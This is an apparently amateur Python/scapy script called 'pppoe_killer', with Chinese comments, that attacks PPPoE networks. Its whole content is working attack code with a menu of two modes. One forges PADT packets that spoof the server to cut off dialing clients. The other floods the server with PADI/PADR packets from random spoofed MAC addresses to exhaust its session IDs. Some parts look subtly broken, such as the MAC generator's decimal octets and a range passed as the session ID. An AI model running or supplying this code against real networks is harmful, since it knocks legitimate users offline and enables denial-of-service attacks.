#This is a program to attack pppoe connection.we called her pppoe_killer
 
#the code is write by me and my friend Lin Yiping
 
#the program based environment is python and scapy,please install scapy module
 
from scapy.all import *
import random
import exceptions
 
#定义一个广播地址的变量
broadcast="ff:ff:ff:ff:ff:ff"
 
 
#定义随机的mac地址，供PPPoE dos攻击使用
def mac():
    vmac=[str(random.randint(10,99)),str(random.randint(10,99)),str(random.randint(10,99)),str(random.randint(10,99)),str(random.randint(10,99)),str(random.randint(10,99))]
    a=":".join(vmac)
    return a
 
     
#定义PPPoE数据包的格式，由参数确定该数据包的类型
def packet(src,dst,code,sessionid=0,len=16):
    a=Ether()/PPPoE()
    a.src=src
    a.dst=dst
    a.type=0x8863
    a.payload.version=1
    a.payload.type=1
    a.payload.code=code
    a.payload.sessionid=sessionid
    a.payload.len=len
    return a
 
#向拨号的客户端发送PADT数据包，切断会话
def client_attack(servermac):
    while True:
        try:
            b=sniff(count=1)
            if b[0].dst=="ff:ff:ff:ff:ff:ff":
                sendp(packet(src=servermac,dst=b[0].src,code=0xa7,sessionid=range(65535),len=0))
                print('We have attach one host,his mac address is '+b[0].src)
        except Exception,e:
            print(e)
            break
 
 
#伪装大量的MAC地址，DOS攻击PPPoE服务器，耗竭其sessionid
def dos_attack(broadcast,servermac):
    while True:
        try:
            c=mac()
            sendp(packet(src=c,dst=broadcast,code=0x09))
            sendp(packet(src=c,dst=servermac,code=0x19))
        except Exception,e:
            print e
            break
 
#获取PPPoE服务器的mac地址
test=srp1(packet(src='11:22:33:44:55:66',dst=broadcast,code=0x09,len=0))
servermac=test.src
 
#输出菜单，选择攻击类型
print '*'*30
print 'when you run the programmer,you should press ctrl+z key to end it'
print 'choice 1.  attack all client make them couldn\'t get pppoe connecttion'
print 'choice 2.  send PADI and PADR dos the pppoe server,make cilent doesn\'s get the sessionid'
print '*'*30
 
#是否做出了合适的选择项
while True:
    choice=input('now make you choice <1 or 2>:')
    if choice!=1 and choice!=2:
        print 'your choice is wrong.please input right choice'
    else:
        break
 
 
print 'now the attack will be beginning'
 
if choice==1:
    client_attack(servermac)
else:
    dos_attack(broadcast,servermac)